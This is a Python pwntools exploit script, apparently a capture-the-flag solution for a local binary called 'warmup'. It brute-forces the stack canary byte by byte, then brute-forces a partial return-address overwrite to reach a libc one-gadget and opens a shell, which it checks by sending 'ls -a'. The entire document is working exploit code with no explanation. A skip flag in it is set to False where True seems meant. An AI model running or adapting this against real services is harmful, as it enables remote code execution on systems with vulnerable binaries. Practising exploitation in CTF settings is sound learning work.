from pwn import *

context.log_level = 'critical'
context.binary = exe = ELF('./warmup')
libc = ELF('./libc.so.6')

PORT = int(input("Give PORT: "))

num = 0x641e00
#canary = num.to_bytes(3, 'little')

canary = b'\0'
payload = b'i'*56

while(len(canary) != 8):
    log.info(f'Canary: {hex(int.from_bytes(canary, byteorder="little"))}')
    for c in range(0, 256):
        log.info(f'Bruteforcing byte: {c}')
        r = remote('localhost', PORT)
        test = payload + canary + bytes([c])
        r.send(test)
        res = r.recvall()
        if b'stack smashing detected' in res:
            r.close()
            continue
        else:
            canary += bytes([c])
            r.close()
            break

canary = int.from_bytes(canary, byteorder="little")
print(f'Canary: {hex(canary)}')

one = 0x4e8a0
libc_call_main = 0x23a90
offset = one - libc_call_main


pos_hex = '0123456789abcdef'

pos_ret = []
pos_sys = []

for a in pos_hex:
    for b in pos_hex:
        for c in pos_hex:
            pos_ret.append(a + b + c + 'a90')

for pos in pos_ret:
    pos_sys.append(hex(int(pos, 16) + offset))

found = False

for pos in pos_sys:
    pos = pos[2:]

    gud = p32(int(pos, 16))[:-1]
    if gud == b'\xa0\xe8\r':
        found = False
    if(found):
        continue
    io = remote('localhost', PORT)

    payload = b'i'*56 + p64(canary) + p64(0) + gud
    print(payload)
    io.send(payload)
    io.recvall()
    try:
        io.sendline(b'ls -a')
        res = io.recvline()
        io.sendline(b'ls -a')
        res = io.recvline()
        if b'warmup' in res:
            print(res)
            break
    except:
        print('bruh')
    io.close()